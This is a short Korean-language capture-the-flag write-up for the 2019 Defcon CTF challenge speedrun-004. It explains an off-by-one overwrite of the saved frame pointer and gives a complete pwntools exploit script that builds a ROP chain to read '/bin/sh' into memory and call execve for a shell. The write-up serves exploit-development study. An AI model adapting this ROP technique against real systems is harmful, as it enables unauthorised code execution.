---
title: "2019 Defcon CTF speedrun-004"
date: 2020-1-4
ctf: Defcon CTF
layout: post
published : false
---

257바이트만큼 입력받을 수 있어서 off-by-one으로 sfp 1byte만큼 덮을 수 있다. buf에 payload작성하고 글루 리턴해주면 된다. 그런데 스택주소가 계속 바껴서 확률적으로 쉘이 따인다.

> exploit.py

```python
from pwn import *

context.log_level = 'debug'
e = ELF('./speedrun-004')
p = process('./speedrun-004')

prax = 0x0000000000415f04 # pop rax ; ret
prbx = 0x0000000000400e88 # pop rbx ; ret
prcx = 0x000000000041d4e3 # pop rcx ; ret
prdx = 0x000000000044a155 # pop rdx ; ret
prdi = 0x0000000000400686 # pop rdi ; ret
prsi = 0x0000000000410a93 # pop rsi ; ret
ret = 0x0000000000400BD1 # ret
syscall = 0x00474f15

p.sendlineafter('?','257')

pay = p64(ret)*(112/8) # ret sled
pay += p64(prdi)
pay += p64(0)
pay += p64(prsi)
pay += p64(e.bss() + 0x300)
pay += p64(prdx)
pay += p64(10)
pay += p64(prax)
pay += p64(0)
pay += p64(syscall)

pay += p64(prdi)
pay += p64(e.bss() + 0x300)
pay += p64(prsi)
pay += p64(0)
pay += p64(prdx)
pay += p64(0)
pay += p64(prax)
pay += p64(59)
pay += p64(syscall)

pay = pay.ljust(257,'\x00')

log.info(len(pay))
p.send(pay)

p.sendline('/bin/sh\x00')

p.interactive()
```

